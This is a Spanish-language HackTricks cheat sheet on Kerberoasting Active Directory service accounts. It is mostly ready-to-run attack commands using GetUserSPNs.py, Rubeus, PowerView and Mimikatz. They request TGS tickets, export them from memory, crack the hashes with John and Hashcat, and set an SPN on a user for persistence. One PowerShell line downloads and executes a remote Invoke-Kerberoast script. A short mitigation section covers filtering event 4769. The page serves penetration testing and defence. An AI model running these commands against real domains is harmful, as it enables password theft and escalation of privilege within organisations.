## Kerberoast

El objetivo de **Kerberoasting** es recolectar **tickets TGS para servicios que se ejecutan en nombre de cuentas de usuario** en AD, no de cuentas de computadora. Por lo tanto, **parte** de estos tickets TGS están **encriptados** con **claves** derivadas de las contraseñas de usuario. Como consecuencia, sus credenciales podrían ser **descifradas sin conexión**.\
Puede saber que una **cuenta de usuario** se está utilizando como un **servicio** porque la propiedad **"ServicePrincipalName"** no es nula.

Por lo tanto, para realizar Kerberoasting, solo se necesita una cuenta de dominio que pueda solicitar TGS, lo que es cualquiera ya que no se requieren privilegios especiales.

**Necesitas credenciales válidas dentro del dominio.**

### **Ataque**

{% hint style="warning" %}
Las herramientas de **Kerberoasting** suelen solicitar **`encriptación RC4`** al realizar el ataque e iniciar solicitudes TGS-REQ. Esto se debe a que **RC4 es** [**más débil**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) y más fácil de descifrar sin conexión utilizando herramientas como Hashcat que otros algoritmos de cifrado como AES-128 y AES-256.\
Los hashes RC4 (tipo 23) comienzan con **`$krb5tgs$23$*`** mientras que los AES-256 (tipo 18) comienzan con **`$krb5tgs$18$*`**`.
{% endhint %}

#### **Linux**
```bash
msf> use auxiliary/gather/get_user_spns
GetUserSPNs.py -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
```
#### Windows

* **Enumerar usuarios vulnerables a Kerberoasting**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Técnica 1: Solicitar TGS y volcarlo desde la memoria**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local 

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Técnica 2: Herramientas automáticas**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Cuando se solicita un TGS, se genera el evento de Windows `4769 - Se solicitó un ticket de servicio Kerberos`.
{% endhint %}



![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
Utilice [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y automatizar fácilmente flujos de trabajo impulsados por las herramientas de la comunidad más avanzadas del mundo.\
Obtenga acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Descifrado
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistencia

Si tienes **suficientes permisos** sobre un usuario, puedes **hacer que sea kerberoastable**:
```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Puedes encontrar **herramientas** útiles para ataques **kerberoast** aquí: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Si encuentras este **error** desde Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** es debido a la hora local, necesitas sincronizar el host con el DC: `ntpdate <IP del DC>`

### Mitigación

Kerberoast es muy sigiloso si es explotable

* Evento de seguridad ID 4769 - Se solicitó un ticket Kerberos
* Dado que 4769 es muy frecuente, filtremos los resultados:
  * El nombre del servicio no debe ser krbtgt
  * El nombre del servicio no debe terminar con $ (para filtrar las cuentas de máquina utilizadas para servicios)
  * El nombre de la cuenta no debe ser machine@domain (para filtrar las solicitudes de máquinas)
  * El código de error debe ser '0x0' (para filtrar los fallos, 0x0 es éxito)
  * Lo más importante, el tipo de cifrado del ticket es 0x17
* Mitigación:
  * Las contraseñas de la cuenta de servicio deben ser difíciles de adivinar (más de 25 caracteres)
  * Utilice cuentas de servicio administradas (cambio automático de contraseña periódicamente y gestión delegada de SPN)
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
**Más información sobre Kerberoasting en ired.team en** [**aquí**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**y** [**aquí**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**.**

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas de la comunidad más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
